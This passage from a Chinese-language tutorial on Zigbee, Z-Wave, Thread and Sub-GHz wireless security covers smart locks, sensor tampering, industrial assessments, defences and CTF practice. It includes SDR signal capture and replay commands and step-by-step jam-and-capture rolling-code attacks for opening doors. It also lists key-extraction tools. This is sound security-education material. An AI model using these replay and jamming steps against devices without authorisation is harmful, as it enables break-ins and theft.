
# 观察门锁是否打开
```

**预期结果**：
- 高质量门锁：重放失败（APS加密+严格计数器）
- 低质量门锁：重放成功（仅NWK加密）

#### 6.2.4 案例总结

智能门锁的安全等级差异很大：
- **高端门锁**：APS加密 + 唯一密钥 + 严格重放保护
- **低端门锁**：仅NWK加密 + 默认密钥 + 无重放保护

**门锁安全检查清单**：
- [ ] 是否使用唯一TC链接密钥
- [ ] 是否启用APS端到端加密
- [ ] 帧计数器是否单调递增且严格校验
- [ ] 是否使用安装代码认证
- [ ] 开锁命令是否有额外的PIN/认证码

### 6.3 案例3：温湿度传感器数据篡改

**目标设备**：Zigbee温湿度传感器
**测试目标**：验证传感器数据是否可被篡改

#### 6.3.1 数据分析

温湿度传感器通常周期性上报数据：

```bash
# 捕获传感器数据上报
zbdump -c 15 -i 0 -w sensor_data.pcap

# 在Wireshark中分析
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0402  # Temperature Measurement
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0405  # Relative Humidity
```

**数据上报特征**：
- 周期：通常每30秒~5分钟上报一次
- 方向：传感器 → 协调器/网关
- 集群：Temperature Measurement (0x0402)、Relative Humidity (0x0405)
- 属性：MeasuredValue（测量值）

#### 6.3.2 数据篡改攻击

**攻击场景**：攻击者伪造传感器数据上报，欺骗网关/平台。

```python
#!/usr/bin/env python3
"""
传感器数据篡改示例
伪造温湿度上报数据
"""

# 攻击前提：
# 1. 已获取网络密钥
# 2. 知道传感器的网络地址和端点
# 3. 知道数据上报的格式和周期

# 攻击方式：
# - 注入伪造的属性上报命令
# - 网关接收到伪造数据后更新显示
# - 可能触发错误的自动化规则（如空调控制）

# 风险评估：
# - 家庭场景：中等（误导用户、影响自动化）
# - 工业/医疗场景：高危（可能导致设备故障或人身伤害）

print("传感器数据篡改攻击演示 - 详见文档说明")
```

#### 6.3.3 防御建议

- 传感器数据应使用APS加密
- 网关注入设备白名单验证
- 数据异常值检测（如温度突然跳变）
- 周期性设备身份认证

### 6.4 案例4：工业Zigbee网络安全评估

**场景**：工业现场Zigbee传感器网络（温度、压力、流量监测）
**目标**：全面评估工业Zigbee网络的安全状况

#### 6.4.1 评估流程

```
1. 前期准备
   ├── 确认测试范围和授权
   ├── 准备测试设备（多个CC2531 + HackRF + 天线）
   └── 制定测试计划

2. 侦察阶段
   ├── 频谱分析（确认频段和信道）
   ├── 网络发现（PAN ID、协调器位置）
   ├── 设备枚举（传感器数量和类型）
   └── 流量模式分析（通信周期、数据量）

3. 安全测试
   ├── 密钥安全测试（默认密钥、密钥强度）
   ├── 重放攻击测试
   ├── 注入攻击测试
   ├── 拒绝服务测试
   └── 设备加入测试

4. 报告输出
   ├── 风险等级评估
   ├── 漏洞详情
   └── 整改建议
```

#### 6.4.2 工业环境特殊考量

1. **物理安全**：工业设备通常分布广泛，部分设备可能在公共区域
2. **可用性优先**：DoS攻击可能导致生产事故，需谨慎测试
3. **设备多样性**：工业Zigbee设备可能来自多家厂商，安全水平参差不齐
4. **协议变种**：部分工业场景使用私有协议扩展
5. **网关安全**：Zigbee网关通常连接工业网络，是重要的攻击跳板

#### 6.4.3 典型发现

工业Zigbee网络常见安全问题：
- 大量使用默认密钥（厂商配置不当）
- 网络密钥长期不更换
- 无设备身份认证（白名单）
- 传感器数据明文传输或仅NWK加密
- 无入侵检测和监控
- 设备固件无法更新或更新机制不安全

---

## 7. 其他IoT无线协议安全

### 7.1 Z-Wave安全分析

Z-Wave是智能家居中另一种重要的无线通信协议，主要用于家庭自动化设备。

#### 7.1.1 协议概述

- **频段**：Sub-GHz（868.42MHz欧洲、908.42MHz北美、921.42MHz澳大利亚）
- **调制方式**：GFSK / FSK
- **数据速率**：9.6/40/100kbps
- **网络拓扑**：Mesh网络
- **最大节点数**：232（主网络）+ 多网桥扩展
- **标准**：ITU-T G.9959

#### 7.1.2 安全框架

Z-Wave有两代安全框架：

**S0安全框架（旧版）**：
- 基于AES-128的加密
- 单个网络密钥共享
- 设备加入时使用默认密钥传输网络密钥
- **安全弱点**：
  - 默认密钥公开（"0000000000000000"或厂商默认）
  - 重放攻击防护较弱
  - 密钥分发不安全

**S2安全框架（新版）**：
- 基于椭圆曲线密码学（ECC）的密钥协商
- 设备加入需要用户物理确认（按按钮或输入PIN）
- 支持多级安全（S2 Unauthenticated / S2 Authenticated / S2 Access Control）
- 每个设备有唯一的密钥
- **安全性显著提升**

#### 7.1.3 Z-Wave攻击面

1. **S0网络密钥攻击**
   - 嗅探设备加入过程
   - 使用默认S0密钥解密网络密钥
   - 工具：zniffer、Ubertooth、SDR

2. **重放攻击**
   - 捕获并重放Z-Wave命令
   - S0框架容易受到攻击
   - S2框架有更好的防护

3. **设备加入攻击**
   - 在设备加入时进行干扰和欺骗
   - S2框架需要物理确认，难度较大

4. **射频干扰**
   - Sub-GHz信号穿透性强，干扰范围大
   - 使用SDR可实现定向干扰

#### 7.1.4 Z-Wave vs Zigbee安全对比

| 特性 | Z-Wave S0 | Z-Wave S2 | Zigbee |
|------|-----------|-----------|--------|
| 加密算法 | AES-128 | AES-128 + ECC | AES-128 |
| 默认密钥问题 | 严重 | 已修复 | 普遍存在 |
| 设备加入认证 | 弱 | 强（需物理确认） | 中等 |
| 重放防护 | 弱 | 强 | 中等 |
| 端到端加密 | 支持 | 支持 | 支持（APS） |
| 已知公开漏洞 | 较多 | 较少 | 较多 |

### 7.2 Thread协议安全

Thread是基于IEEE 802.15.4的新一代IoT网络协议，与Matter紧密结合。

#### 7.2.1 协议概述

- **基础**：IEEE 802.15.4 + IPv6（6LoWPAN）
- **频段**：2.4GHz
- **网络层**：IPv6 over 802.15.4
- **路由协议**：RPL（IPv6 Routing Protocol for LLNs）
- **应用层**：CoAP、MQTT-SN、Matter
- **生态**：Google Nest、Apple HomeKit、Amazon Alexa

#### 7.2.2 安全机制

Thread的安全设计比Zigbee更现代：

1. **MAC层加密**
   - 使用IEEE 802.15.4 MAC层安全
   - AES-CCM加密
   - 每个设备有唯一的MLE密钥

2. **设备加入认证**
   - 基于DTLS（Datagram TLS）的认证
   - 使用预共享密钥（PSK）或证书
   - 设备需要Thread Credentials才能加入

3. **Commissioning（配置）流程**
   - 分为两步：
     a. 网络配置（Network Commissioning）：加入Thread网络
     b. 设备配置（Device Commissioning）：配置应用层凭据
   - 使用Thread Border Router进行管理

4. **密钥体系**
   - **Master Key**：网络主密钥，派生所有其他密钥
   - **MLE Key**：Mesh Link Establishment密钥
   - **MAC Key**：MAC层加密密钥
   - 密钥定期更新（Key Rotation）

#### 7.2.3 Thread安全优势（对比Zigbee）

- 基于IP协议栈，安全协议更成熟
- DTLS设备认证比Zigbee的密钥分发更安全
- 密钥更新机制更完善
- 与Matter结合后，应用层安全更标准化
- 更少的历史遗留问题

#### 7.2.4 潜在安全问题

- 实现漏洞（如OpenThread中的漏洞）
- 边界路由器安全（连接Thread网络和IP网络）
- 配置过程中的攻击窗口
- 供应链攻击（预配置密钥泄露）

### 7.3 433MHz/315MHz无线遥控安全

433MHz和315MHz是最常见的Sub-GHz ISM频段，广泛用于遥控器、安防传感器、车库门等设备。

#### 7.3.1 固定码（Fixed Code）遥控

**工作原理**：
- 遥控器每次发送相同的编码
- 接收器匹配地址码和命令码
- 编码方式：OOK（On-Off Keying）/ ASK调制

**安全问题**：
1. **重放攻击**：捕获一次信号即可无限重放
2. **暴力破解**：地址码位数有限（通常8-12位）
3. **代码扫描**：逐次尝试所有可能的编码

**攻击工具**：
- RTL-SDR / HackRF / Yard Stick One
- Universal Radio Hacker（URH）
- rfcat
- 廉价的433MHz收发模块（如CC1101）

**攻击步骤**：

```bash
# 使用HackRF + URH捕获信号
# 1. 打开Universal Radio Hacker
# 2. 设置频率：433.92MHz
# 3. 采样率：2Msps
# 4. 按下遥控器按键，捕获信号
# 5. 分析信号调制方式和编码
# 6. 保存信号，可随时重放

# 使用rtl_433解码常见设备信号
rtl_433 -f 433920000 -R 0

# 使用hackrf_transfer重放信号
hackrf_transfer -t captured_signal.bin -f 433920000 -s 2000000 -x 20
```

#### 7.3.2 滚动码（Rolling Code）遥控

**工作原理**：
- 每次发送的代码都不同
- 发送方和接收方同步计数器
- 使用加密算法生成下一个代码
- 常见方案：Keeloq、HCS系列

**滚动码系统结构**：
```
每次发送的信号：
| 序列号/计数器 | 功能码 | 加密的滚动码 |
    （明文）      （明文）   （加密）
```

**攻击方法**：

1. **重放窗口攻击（Replay Window）**
   - 接收器通常接受一定范围内的计数器值
   - 捕获一个有效代码后，可能在一定范围内仍然有效

2. **干扰+捕获攻击（Jammer + Capture）**
   ```
   攻击步骤：
   1. 攻击者在目标附近放置干扰器
   2. 用户按下遥控器
   3. 干扰器阻止信号到达接收器
   4. 攻击者捕获遥控器发送的滚动码
   5. 用户再次按下遥控器
   6. 攻击者再次捕获，但不干扰
   7. 第二次信号到达接收器，计数器+1
   8. 攻击者保存的第一个滚动码仍然有效（在窗口内）
   9. 攻击者可在之后使用第一个代码开门
   ```

3. **侧信道攻击**
   - 通过功耗分析等方式提取加密密钥
   - 需要物理接触设备

4. **加密算法破解**
   - Keeloq算法已被证明存在弱点
   - 已知明文攻击可恢复密钥

**工具**：
- Yard Stick One（Sub-GHz收发）
- RFCat
- Universal Radio Hacker
- 自定义硬件（如基于CC1101的设备）

#### 7.3.3 常见设备类型

| 设备类型 | 频段 | 编码类型 | 安全等级 |
|----------|------|----------|----------|
| 车库门遥控器 | 315/433MHz | 固定码/滚动码 | 低~中 |
| 汽车遥控钥匙 | 315/433MHz | 滚动码 | 中 |
| 无线门铃 | 433MHz | 固定码 | 很低 |
| 无线开关 | 433MHz | 固定码 | 很低 |
| 防盗报警器 | 433MHz | 固定码/滚动码 | 低~中 |
| 无线传感器 | 433/868MHz | 固定码 | 低 |

### 7.4 Sub-GHz设备攻击实战（使用SDR）

#### 7.4.1 硬件选择

**入门级**：
- **RTL-SDR**：约100元，仅接收，支持24-1766MHz
- **DVB-T dongle**：RTL2832U芯片，最便宜的SDR

**进阶级**：
- **HackRF One**：约2000元，收发一体，1MHz-6GHz
- **Yard Stick One**：约800元，Sub-GHz专用，300-928MHz
- **CC1101模块**：约20元，需配合单片机使用

**专业级**：
- **USRP**：数千至数万元，高性能SDR
- **BladeRF**：约3000元，USB 3.0高速

#### 7.4.2 软件工具

| 工具 | 用途 |
|------|------|
| GNU Radio | SDR信号处理框架 |
| Universal Radio Hacker | 无线协议逆向分析 |
| rtl_433 | 433MHz设备信号解码 |
| inspectrum | 信号可视化分析 |
| Gqrx | SDR接收器软件 |
| osmocom_fft | 频谱分析 |
| rfcat | Sub-GHz收发工具 |
| KillerBee | Zigbee专用 |

#### 7.4.3 实战：信号分析与重放通用流程

```
1. 信号侦察
   ├── 使用频谱仪确定目标频率
   ├── 观察信号特征（调制方式、速率、持续时间）
   └── 记录信号出现的时间和条件

2. 信号捕获
   ├── 设置正确的中心频率和采样率
   ├── 触发目标设备发送信号
   ├── 捕获并保存原始IQ数据
   └── 多次捕获以分析变化规律

3. 信号分析
   ├── 确定调制方式（ASK/FSK/OOK）
   ├── 解码数据（曼彻斯特编码、不归零码等）
   ├── 分析数据包结构
   ├── 识别固定部分和变化部分
   └── 判断是否为滚动码

4. 攻击实施
   ├── 固定码：直接重放
   ├── 滚动码：尝试重放窗口攻击
   ├── 暴力破解：逐次尝试
   └── 干扰攻击：阻止正常通信
```

#### 7.4.4 Universal Radio Hacker使用指南

URH是最强大的无线协议分析工具之一：

**基本功能**：
- 支持多种SDR硬件（HackRF、RTL-SDR、USRP等）
- 自动调制识别
- 信号解码和分析
- 数据包生成和重放
- 协议逆向工程

**典型工作流**：
1. 捕获信号（Record）
2. 自动识别调制参数
3. 解码为比特流
4. 分析数据包结构
5. 标记字段（地址、命令、校验等）
6. 生成自定义数据包
7. 重放测试

---

## 8. 防御与加固建议

### 8.1 Zigbee网络安全最佳实践

#### 8.1.1 网络部署安全

**1. 使用强密钥**
- 绝对不要使用默认的信任中心链接密钥
- 为每个网络使用唯一的网络密钥
- 密钥应使用随机生成的128位数据
- 定期更换网络密钥（建议每3-6个月）

**2. 设备加入控制**
- 启用安装代码（Install Code）认证
- 维护设备白名单（基于IEEE地址）
- 关闭开放加入（Permit Joining）
- 设备加入需管理员确认
- 加入窗口应尽可能短

**3. 网络隔离**
- IoT网络与办公/家庭网络隔离
- Zigbee网关应配置防火墙规则
- 限制Zigbee设备的IP访问范围
- 使用VLAN隔离IoT设备

#### 8.1.2 安全配置清单

```
Zigbee网络安全配置清单：

[ ] 1. 更改默认信任中心链接密钥
[ ] 2. 使用随机生成的网络密钥
[ ] 3. 启用安装代码认证
[ ] 4. 关闭永久允许加入
[ ] 5. 启用设备白名单
[ ] 6. 启用APS加密（关键设备）
[ ] 7. 启用帧计数器检查
[ ] 8. 定期更新网络密钥
[ ] 9. 物理保护协调器/网关
[ ] 10. 监控异常设备加入
[ ] 11. 启用安全日志记录
[ ] 12. 定期安全审计
```

### 8.2 密钥管理建议

#### 8.2.1 密钥生成

- 使用密码学安全的随机数生成器（CSPRNG）
- 密钥长度：128位（AES-128要求）
- 避免使用可预测的密钥（如厂商名、产品名）
- 每个设备/网络使用唯一密钥

#### 8.2.2 密钥存储

- 密钥应存储在安全的硬件存储中（如Secure Element）
- 避免将密钥明文存储在固件中
- 使用密钥派生函数（KDF）从主密钥派生工作密钥
- 限制密钥的访问权限

#### 8.2.3 密钥更新

- 建立密钥更新机制
- 网络密钥应定期轮换
- 密钥更新过程本身需要安全保护
- 支持密钥回滚（以防更新失败）

#### 8.2.4 密钥泄露响应

- 制定密钥泄露应急响应计划
- 发现泄露后立即更换密钥
- 审计日志确定泄露影响范围
- 检查是否有恶意设备已加入网络

### 8.3 设备选型安全考虑

#### 8.3.1 安全功能评估

选购Zigbee设备时应考察以下安全特性：

| 安全特性 | 要求 | 重要性 |
|----------|------|--------|
| 唯一TC链接密钥 | 必须 | 高 |
| 安装代码支持 | 必须 | 高 |
| APS加密支持 | 推荐 | 中 |
| 帧计数器检查 | 必须 | 高 |
| 安全OTA升级 | 推荐 | 中 |
| 安全启动 | 推荐 | 中 |
| 防篡改保护 | 可选 | 低 |
| 安全认证（如Zigbee 3.0） | 推荐 | 中 |

#### 8.3.2 厂商安全评估

- 查看厂商是否有安全公告机制
- 历史上是否有未修复的安全漏洞
- 是否提供定期固件更新
- 是否有漏洞披露政策
- 是否通过第三方安全认证

#### 8.3.3 避免高危设备

尽量避免使用以下设备：
- 不支持任何加密的设备
- 使用固定默认密钥且无法更改的设备
- 上市多年从未更新固件的设备
- 不知名小厂商生产的廉价设备
- 不支持Zigbee 3.0的老旧设备

### 8.4 网络隔离与监控

#### 8.4.1 网络隔离架构

```
互联网
   │
   ├── 防火墙/路由器
   │    │
   │    ├── [主网络VLAN] 电脑、手机、NAS
   │    │
   │    └── [IoT网络VLAN] 智能家居设备
   │         │
   │         └── Zigbee网关
   │              │
   │              └── Zigbee设备（灯泡、传感器、门锁等）
   │
   └── [访客网络] 访客设备
```

**隔离要点**：
- Zigbee网关放在IoT VLAN中
- IoT VLAN无法访问主网络
- 仅开放必要的端口和服务
- 云端通信走代理，可监控和审计

#### 8.4.2 安全监控

**监控内容**：
1. **异常设备加入**：监控新设备加入事件
2. **异常流量模式**：突然增加的数据包、异常命令
3. **密钥更新失败**：可能表示攻击尝试
4. **设备离线/异常**：可能受到物理攻击或干扰

**监控工具**：
- Zigbee网关日志
- 网络管理平台
- 专用的IoT安全监控系统
- IDS/IPS（针对Zigbee网关的IP流量）

#### 8.4.3 入侵检测

Zigbee入侵检测的挑战：
- 无线介质，攻击难以溯源
- 设备资源有限，无法安装代理
- 协议解析复杂

**检测方法**：
- 异常流量分析（基于基线）
- 重放攻击检测（帧计数器异常）
- 设备指纹验证
- 信标帧异常检测
- 加入请求频率监控

### 8.5 固件安全更新

#### 8.5.1 OTA更新安全

Zigbee OTA更新集群（0x0019）安全要求：

1. **固件签名验证**
   - 固件必须经过厂商数字签名
   - 设备只接受签名正确的固件
   - 使用非对称加密（如ECC）

2. **固件加密**
   - 传输过程加密保护
   - 防止固件泄露和逆向

3. **版本检查**
   - 禁止降级到旧版本（防回滚攻击）
   - 检查版本号的合法性

4. **更新过程完整性**
   - 校验固件完整性（CRC/哈希）
   - 断电恢复机制
   - 备份旧固件（双分区设计）

#### 8.5.2 固件安全最佳实践

**厂商侧**：
- 使用安全启动（Secure Boot）
- 固件加密存储
- 启用硬件安全模块（如可用）
- 定期发布安全更新
- 建立漏洞响应机制

**用户侧**：
- 及时更新设备固件
- 从官方渠道获取固件
- 验证固件来源和完整性
- 关注厂商安全公告

---

## 9. 工具与资源汇总

### 9.1 硬件设备推荐与购买链接

#### 9.1.1 Zigbee专用硬件

| 设备 | 价格区间 | 购买渠道 | 推荐指数 |
|------|----------|----------|----------|
| CC2531 USB Dongle | 15-30元 | 淘宝/AliExpress | ★★★★★ |
| CC2531 + CC2592功放版 | 30-60元 | 淘宝/AliExpress | ★★★★☆ |
| CC Debugger 烧录器 | 20-50元 | 淘宝/AliExpress | ★★★★☆ |
| ATUSB RZUSB Stick | 300-500元 | DigiKey/Mouser | ★★★☆☆ |
| TelosB Mote | 200-400元 | 淘宝/厂商 | ★★★☆☆ |
| nRF52840 Dongle | 50-100元 | 淘宝/Nordic官方 | ★★★☆☆ |

#### 9.1.2 SDR硬件

| 设备 | 价格区间 | 频率范围 | 推荐指数 |
|------|----------|----------|----------|
| RTL-SDR Blog V3 | 150-200元 | 0.5-1766MHz（仅收） | ★★★★★ |
| HackRF One | 1500-3000元 | 1MHz-6GHz（收发） | ★★★★☆ |
| Yard Stick One | 600-1000元 | 300-928MHz（收发） | ★★★★☆ |
| BladeRF 2.0 micro | 2000-4000元 | 47MHz-6GHz（收发） | ★★★☆☆ |
| Ubertooth One | 800-1200元 | 2.4GHz（蓝牙专用） | ★★★☆☆ |

#### 9.1.3 天线与配件

| 配件 | 用途 | 价格 |
|------|------|------|
| 2.4GHz全向天线（5dBi） | Zigbee/WiFi嗅探 | 10-30元 |
| 2.4GHz定向天线（10dBi） | 远距离攻击 | 50-150元 |
| 433MHz天线 | Sub-GHz通信 | 10-50元 |
| SMA转接线/转接头 | 连接不同接口 | 5-20元 |
| 信号放大器 | 增加发射功率 | 50-200元 |

**购买提示**：
- 淘宝搜索关键词：CC2531、CC Debugger、HackRF、RTL-SDR
- AliExpress适合国际用户
- 注意CC2531有带天线和不带天线版本，建议买带天线的版本
- 购买前确认固件是否支持KillerBee

### 9.2 软件工具清单

#### 9.2.1 Zigbee专用工具

| 工具 | 功能 | 平台 | 开源 |
|------|------|------|------|
| KillerBee | Zigbee攻击框架 | Linux/Windows/OSX | 是 |
| Wireshark | 协议分析 | 全平台 | 是 |
| Z-Stack | TI官方协议栈 | 嵌入式 | 部分 |
| zigbee2mqtt | Zigbee网关 | Linux/树莓派 | 是 |
| Zigpy | Python Zigbee库 | Linux | 是 |
| zbid | 设备识别（KillerBee组件） | Linux/OSX | 是 |
| zbstumbler | 网络扫描（KillerBee组件） | Linux/OSX | 是 |
| zbdump | 数据包捕获（KillerBee组件） | Linux/OSX | 是 |
| zbreplay | 重放攻击（KillerBee组件） | Linux/OSX | 是 |
| zbgoodfind | 密钥查找（KillerBee组件） | Linux/OSX | 是 |
| zbfake | 协调器伪造（KillerBee组件） | Linux/OSX | 是 |

#### 9.2.2 SDR通用工具

| 工具 | 功能 | 平台 |
|------|------|------|
| GNU Radio | SDR信号处理框架 | Linux/Windows/OSX |
| Universal Radio Hacker | 无线协议逆向 | Linux/Windows/OSX |
| Gqrx | SDR接收器 | Linux/OSX |
| SDR# (SDRSharp) | SDR接收器（Windows首选） | Windows |
| inspectrum | 信号可视化分析 | Linux/OSX |
| rtl_433 | 433MHz设备解码 | Linux/Windows/OSX |
| rfcat | Sub-GHz收发工具 | Linux/OSX |
| hackrf_tools | HackRF工具集 | Linux/Windows/OSX |

#### 9.2.3 其他IoT无线工具

| 工具 | 用途 |
|------|------|
| Bettercap | WiFi/BT/Zigbee综合攻击 |
| Aircrack-ng | WiFi安全测试 |
| MDK3 | WiFi DoS工具 |
| blue_hydra | 蓝牙设备发现 |
| btlejuice | BLE中间人攻击 |
| Gattacker | BLE安全测试框架 |
| URH（Universal Radio Hacker） | 通用无线协议分析 |

### 9.3 学习资源与社区

#### 9.3.1 官方规范文档

- **Zigbee Specification**：Zigbee联盟官方协议规范
  - 网址：https://zigbeealliance.org/
- **IEEE 802.15.4 Standard**：底层无线标准
  - 网址：https://standards.ieee.org/
- **Zigbee Cluster Library (ZCL)**：应用层集群规范
  - 包含在Zigbee 3.0规范中

#### 9.3.2 在线课程与教程

- **Zigbee Security by Josh Wright** - 安全研究培训
- **SANS SEC522: IoT Security** - 包含Zigbee模块
- **Offensive IoT Exploitation** - 硬件和无线安全
- **Hack the IoT** - 在线IoT安全课程

#### 9.3.3 推荐书籍

1. **《ZigBee Wireless Networks and Transceivers》**
   - 作者：Shahin Farahani
   - 内容：Zigbee技术原理详解

2. **《The Basics of Hacking and Penetration Testing》**
   - 包含IoT无线安全入门内容

3. **《IoT Penetration Testing Cookbook》**
   - 作者：Aaron Guzman等
   - 内容：IoT渗透测试实战

4. **《Hardware Hacking Handbook》**
   - 作者：Colin O'Flynn
   - 内容：硬件攻击基础（含无线）

#### 9.3.4 技术社区

| 社区 | 网址 | 特点 |
|------|------|------|
| Reddit - r/IOTsec | reddit.com/r/iotsec | IoT安全讨论 |
| Reddit - r/hackrf | reddit.com/r/hackrf | HackRF用户社区 |
| Reddit - r/RTLSDR | reddit.com/r/RTLSDR | RTL-SDR用户社区 |
| eevblog论坛 | eevblog.com | 电子工程社区 |
| 看雪论坛 | pediy.com | 国内安全社区 |
| 安全客 | anquanke.com | 国内安全资讯 |
| FreeBuf | freebuf.com | 国内安全媒体 |

#### 9.3.5 GitHub项目

| 项目 | 地址 | 说明 |
|------|------|------|
| KillerBee | github.com/riverloopsec/killerbee | Zigbee攻击框架 |
| zigbee-sniffer-firmware | github.com/... | CC2531嗅探固件 |
| zigpy | github.com/zigpy/zigpy | Python Zigbee库 |
| zigbee2mqtt | github.com/Koenkk/zigbee2mqtt | Zigbee网关 |
| Universal Radio Hacker | github.com/jopohl/urh | 无线协议分析 |
| rtl_433 | github.com/merbanan/rtl_433 | 433MHz解码 |
| rfcat | github.com/atlas0fd00m/rfcat | Sub-GHz工具 |
| Bettercap | github.com/bettercap/bettercap | 无线攻击综合工具 |

### 9.4 CTF中的Zigbee题目

#### 9.4.1 常见题型

Zigbee在CTF中出现的频率不高，但逐渐增多。常见题型：

1. **流量分析题**
   - 给出pcap文件，分析Zigbee通信
   - 考点：协议解析、密钥解密、数据提取
   - 工具：Wireshark + KillerBee

2. **重放攻击题**
   - 捕获的Zigbee流量中有flag
   - 需要重放特定命令获取flag
   - 考点：重放攻击、命令识别

3. **密钥破解题**
   - 给出包含设备加入过程的pcap
   - 需要从pcap中提取网络密钥
   - 考点：密钥分发机制、默认密钥、AES解密

4. **固件逆向题**
   - 给出Zigbee设备固件
   - 分析固件中的密钥和协议实现
   - 考点：固件逆向、密钥提取

5. **现场实战题**
   - 现场有真实Zigbee设备
   - 需要物理攻击+无线攻击
   - 考点：综合能力

#### 9.4.2 CTF解题思路

**流量分析题通用解法**：

```bash
# 步骤1：打开pcap，确认协议
wireshark challenge.pcap

# 步骤2：查看是否有加密
# 检查NWK安全位是否为1

# 步骤3：尝试解密
# 如果有加密，尝试常见默认密钥
# 在Wireshark中配置密钥

# 步骤4：分析ZCL命令和属性
# 寻找包含flag的字段

# 步骤5：提取数据
# 使用tshark批量提取
tshark -r challenge.pcap -T fields -e zbee_zcl.payload
```

**密钥查找题**：

```bash
# 使用zbgoodfind自动查找
zbgoodfind -f challenge.pcap

# 如果失败，尝试常见厂商密钥
zbgoodfind -f challenge.pcap -k common_keys.txt

# 手动分析Transport Key帧
# 在Wireshark中查找NWK Command: Transport Key
```

#### 9.4.3 已知CTF比赛中的Zigbee题目

- **DEF CON**：偶尔有IoT相关题目，可能涉及Zigbee
- **Hack The Box**：部分IoT靶机包含Zigbee
- **Pwn2Own**：有IoT设备分类，包含Zigbee设备
- **国内CTF**：XCTF联赛等偶尔有IoT无线题目
- **IoT CTF**：专门的IoT安全竞赛

**练习建议**：
- 先熟悉Wireshark的Zigbee解析
- 掌握KillerBee基本工具的使用
- 自己搭建Zigbee网络进行实验
- 尝试分析公开的Zigbee pcap样本

---

## 总结

Zigbee作为应用最广泛的IoT无线协议之一，其安全问题直接关系到大量智能设备的安全性。本文档从协议原理、安全机制、侦察嗅探、攻击技术、工具使用、实战案例等多个维度，系统介绍了Zigbee安全研究的知识体系。

**核心要点回顾**：

1. **协议基础**：Zigbee基于IEEE 802.15.4，采用分层架构，支持多种网络拓扑
2. **安全机制**：三层密钥体系（TC链接密钥、网络密钥、应用链接密钥），默认密钥是最大弱点
3. **侦察嗅探**：使用CC2531 + KillerBee + Wireshark进行网络发现和流量分析
4. **攻击技术**：网络密钥攻击、重放攻击、注入攻击、MITM、协调器攻击
5. **工具使用**：KillerBee是最核心的工具框架，支持自定义脚本开发
6. **实战案例**：从灯泡到门锁，不同设备的安全状况差异巨大
7. **其他协议**：Z-Wave、Thread、Sub-GHz各有特点，安全问题相似又不同
8. **防御加固**：密钥管理、设备选型、网络隔离、安全监控是关键

**学习路径建议**：
1. 先掌握Zigbee协议基础和安全机制
2. 购买CC2531等硬件，搭建实验环境
3. 熟练使用KillerBee工具集
4. 从简单的重放攻击开始实践
5. 逐步深入到密钥攻击和自定义脚本开发
6. 扩展学习其他IoT无线协议
7. 参与CTF和安全社区交流

**法律与道德提示**：
- 本文档仅供学习和研究使用
- 未经授权攻击他人网络和设备是违法行为
- 请在授权范围内进行安全测试
- 遵守当地法律法规和道德规范

---



